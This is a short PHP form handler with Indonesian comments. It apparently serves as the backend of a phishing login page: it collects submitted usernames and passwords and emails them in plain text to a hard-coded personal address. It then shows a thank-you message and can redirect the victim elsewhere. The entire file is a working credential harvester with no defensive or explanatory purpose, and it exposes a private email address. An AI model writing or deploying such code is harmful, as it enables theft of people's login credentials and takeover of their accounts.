<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Ganti dengan alamat email Anda
    $penerima = "iqballoveamy11@gmail.com"; 
    $subjek = "Data Login Baru dari Website";
    
    // Ambil data dari form
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Format isi email
    $pesan = "Anda menerima data baru:\n";
    $pesan .= "Username: " . $username . "\n";
    $pesan .= "Kata Sandi: " . $password . "\n";
    
    // Header email (penting agar tidak masuk spam)
    $headers = "From: Notifikasi Website <noreply@yourwebsite.com>";
    
    // Kirim email
    if (mail($penerima, $subjek, $pesan, $headers)) {
        // Jika berhasil, tampilkan pesan ini
        echo "<h1>Data berhasil dikirim. Terima kasih!</h1>";
        // Anda bisa juga mengarahkan kembali ke halaman lain
        // header("Location: https://halamantujuan.com");
    } else {
        // Jika gagal, tampilkan pesan error
        echo "<h1>Maaf, terjadi kesalahan saat mengirim data.</h1>";
    }
} else {
    // Jika file diakses langsung tanpa kirim data, tolak akses
    echo "Akses ditolak.";
}
?>
